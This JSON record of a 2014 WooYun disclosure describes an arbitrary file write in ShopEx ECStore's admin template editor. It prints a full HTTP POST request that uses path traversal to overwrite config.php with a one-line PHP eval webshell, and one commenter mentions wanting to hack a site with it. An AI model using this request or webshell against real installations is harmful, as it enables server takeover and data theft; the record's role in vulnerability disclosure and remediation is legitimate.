{"id": 46162, "wybug_id": "wooyun-2014-085667", "wybug_title": "ECStore开源网店系统任意文件修改漏洞可拿shell", "wybug_corp": "ShopEx", "wybug_author": "Asuimu", "wybug_date": "2014-12-03 10:32", "wybug_open_date": "2015-03-03 10:34", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-03：\t细节向公众公开  简要描述： 模板编辑中的文件编辑功能，对可编辑的文件限制不严，导致可以修改系统中存在的任意文件 详细说明：  文件编辑功能中选择要修改的文件，这里选图片（模板文件也可以），然后上传图片时将file_name参数设置为网站的任意php文件，如/index.php或/config/config.php，将图片内容设置为shell内容。。。。\n\npost数据如下：POST /index.php/shopadmin/index.php?app=site&ctl=admin_explorer_theme&act=save_image HTTP/1.1Host: shop.xxx.comContent-Length: 846527Cache-Control: max-age=0Accept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: xxxxxxxxx------WebKitFormBoundaryHSNjVhgvrpnTmmQDContent-Disposition: form-data; name=\"theme\"ecstore------WebKitFormBoundaryHSNjVhgvrpnTmmQDContent-Disposition: form-data; name=\"open_path\"------WebKitFormBoundaryHSNjVhgvrpnTmmQDContent-Disposition: form-data; name=\"file_name\"../../config/config.php------WebKitFormBoundaryHSNjVhgvrpnTmmQDContent-Disposition: form-data; name=\"upfile\"; filename=\"Desert.jpg\"Content-Type: image/jpeg<?php @eval($_POST['chopper']);?>------WebKitFormBoundaryHSNjVhgvrpnTmmQDContent-Disposition: form-data; name=\"has_bak\"1------WebKitFormBoundaryHSNjVhgvrpnTmmQD--\n\n同样，在编辑html或xml文件时也存在该问题\n\n   漏洞证明：  成功连接webshell\n\nshell是拿到了，可config文件被修改后，但网站挂了。。。。。   修复方案：  限制要file_name参数值，不要让其修改模板目录以外的文件   版权声明：转载请注明来源 Asuimu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-12-03 10:35 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-03 10:33 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:48        | 国家一级保护动物)\t\t \n  后台还是？    \n     2014-12-03 11:11 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:102        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  分分钟确认啊，关注！    \n     2014-12-03 12:17 |    \t\t老胖子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        )\t\t \n  速度公开吧，有个这个站没搞下    \n     2014-12-03 16:17 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:58        | going)\t\t \n  后台模板编辑？    \n     2014-12-07 17:43 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  路过    \n     2015-01-06 16:41 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n  后台？    \n     2015-01-12 17:55 |    \t\t狂小子 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:2        | 和昵称不符)\t\t \n  后台的话还得先找后台账号。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}